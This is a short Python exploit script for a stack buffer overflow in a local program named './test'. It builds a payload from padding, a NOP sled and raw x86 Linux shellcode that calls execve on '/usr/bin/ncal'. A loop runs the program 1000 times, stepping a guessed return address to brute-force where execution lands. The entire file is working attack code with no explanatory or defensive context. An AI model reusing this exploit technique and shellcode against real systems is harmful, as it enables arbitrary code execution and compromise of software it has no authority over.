import struct
from subprocess import *
import os



shellcode ='\xeb\x16\x5e\x31\xd2\x52\x56\x89\xe1\x89\xf3\x31\xc0\xb0\x0b\xcd\x80\x31\xdb\x31\xc0\x40\xcd\x80\xe8\xe5\xff\xff\xff\x2f\x75\x73\x72\x2f\x62\x69\x6e\x2f\x6e\x63\x61\x6c'



nop = "\x90"*20
ret = "\xc8\xee\xff\xbf"#0xbfffeec8
junk = "A"*43

offset = 20
test = 1000
while test > 0 :

	x = (struct.unpack("<I",ret))[0]

	print ('ret : ' + hex(x))
	call(['./test', junk + ret ,'a', nop + shellcode])

	x += offset	

	x = struct.pack('<I',x)

	ret = x

	test -=1
